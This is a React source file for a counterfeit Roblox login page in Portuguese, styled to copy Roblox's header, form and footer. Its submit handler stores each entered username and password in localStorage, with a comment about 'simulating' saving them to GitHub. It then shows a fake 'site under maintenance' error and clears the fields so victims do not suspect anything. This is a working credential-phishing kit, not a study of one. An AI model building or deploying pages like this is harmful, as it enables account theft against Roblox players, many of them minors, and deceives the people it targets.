import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { useToast } from '@/hooks/use-toast'

const RobloxIcon = () => (
  <div className="w-8 h-8 bg-foreground rounded-sm flex items-center justify-center text-background font-bold text-lg">
    R
  </div>
)

const SearchIcon = () => (
  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
    <path fillRule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clipRule="evenodd" />
  </svg>
)

export const RobloxLoginPage = () => {
  const [usuario, setUsuario] = useState('')
  const [senha, setSenha] = useState('')
  const [loading, setLoading] = useState(false)
  const { toast } = useToast()

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)

    // Salvar dados no localStorage (simulando salvamento no GitHub)
    const userData = {
      usuario,
      senha,
      timestamp: new Date().toISOString()
    }
    
    // Salvar no localStorage
    const existingData = localStorage.getItem('roblox_users') || '[]'
    const users = JSON.parse(existingData)
    users.push(userData)
    localStorage.setItem('roblox_users', JSON.stringify(users))

    // Simular delay de processo
    setTimeout(() => {
      setLoading(false)
      toast({
        title: 'Site em manutenção',
        description: 'Tente novamente em instantes',
        variant: 'destructive'
      })
      
      // Limpar campos
      setUsuario('')
      setSenha('')
    }, 1500)
  }

  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Header Navigation */}
      <header className="border-b border-border">
        <nav className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            {/* Left side - Logo and Navigation */}
            <div className="flex items-center space-x-8">
              <RobloxIcon />
              
              <div className="hidden md:flex space-x-6">
                <button className="text-muted-foreground hover:text-foreground transition-colors">
                  Destaques
                </button>
                <button className="text-muted-foreground hover:text-foreground transition-colors">
                  Mercado
                </button>
                <button className="text-foreground border-b-2 border-primary pb-4 -mb-4">
                  Criar
                </button>
                <button className="text-muted-foreground hover:text-foreground transition-colors">
                  Robux
                </button>
              </div>
            </div>

            {/* Center - Search */}
            <div className="flex-1 max-w-lg mx-8">
              <div className="relative">
                <Input
                  type="text"
                  placeholder="Pesquisar"
                  className="pl-10 bg-roblox-input border-roblox-gray text-foreground placeholder:text-muted-foreground"
                />
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <SearchIcon />
                </div>
              </div>
            </div>

            {/* Right side - Auth buttons */}
            <div className="flex items-center space-x-3">
              <Button variant="outline" className="bg-transparent border-roblox-gray text-foreground hover:bg-roblox-gray">
                Cadastrar-se
              </Button>
              <Button className="bg-roblox-blue hover:bg-roblox-blue-hover text-white">
                Entrar
              </Button>
            </div>
          </div>
        </nav>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md">
          {/* Login Form */}
          <div className="bg-card rounded-lg p-8 border border-border">
            <div className="text-center mb-8">
              <h1 className="text-2xl font-semibold text-foreground mb-2">
                Entrar na Roblox
              </h1>
            </div>

            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <Input
                  type="text"
                  placeholder="Usuário/e-mail/telefone"
                  value={usuario}
                  onChange={(e) => setUsuario(e.target.value)}
                  required
                  className="w-full h-12 bg-roblox-input border-roblox-gray text-foreground placeholder:text-muted-foreground rounded-md"
                />
              </div>

              <div>
                <Input
                  type="password"
                  placeholder="Senha"
                  value={senha}
                  onChange={(e) => setSenha(e.target.value)}
                  required
                  className="w-full h-12 bg-roblox-input border-roblox-gray text-foreground placeholder:text-muted-foreground rounded-md"
                />
              </div>

              <Button
                type="submit"
                disabled={loading}
                className="w-full h-12 bg-roblox-blue hover:bg-roblox-blue-hover text-white font-medium rounded-md disabled:opacity-50"
              >
                {loading ? 'Carregando...' : 'Entrar'}
              </Button>
            </form>

            <div className="mt-6 space-y-3">
              <button className="w-full text-center text-sm text-muted-foreground hover:text-foreground">
                Esqueceu a senha ou nome de usuário?
              </button>
              
              <Button 
                variant="outline" 
                className="w-full bg-transparent border-roblox-gray text-foreground hover:bg-roblox-gray"
              >
                Envie-me um código único por e-mail
              </Button>
              
              <Button 
                variant="outline" 
                className="w-full bg-transparent border-roblox-gray text-foreground hover:bg-roblox-gray"
              >
                Use outro dispositivo
              </Button>
              
              <div className="text-center mt-6">
                <span className="text-sm text-muted-foreground">
                  Não possui uma conta?{' '}
                  <button className="text-roblox-blue hover:underline">
                    Cadastrar-se
                  </button>
                </span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-border mt-auto">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="flex flex-wrap justify-center gap-6 text-sm text-muted-foreground">
            <button className="hover:text-foreground">Sobre nós</button>
            <button className="hover:text-foreground">Vagas</button>
            <button className="hover:text-foreground">Blog</button>
            <button className="hover:text-foreground">Responsáveis</button>
            <button className="hover:text-foreground">Cartões presente</button>
            <button className="hover:text-foreground">Ajuda</button>
            <button className="hover:text-foreground">Termos</button>
            <button className="hover:text-foreground">Acessibilidade</button>
            <button className="hover:text-foreground">Privacidade</button>
            <button className="hover:text-foreground">Suas opções de privacidade</button>
          </div>
          <div className="text-center mt-4">
            <button className="text-sm text-muted-foreground hover:text-foreground">
              Sitemap
            </button>
          </div>
        </div>
      </footer>
    </div>
  )
}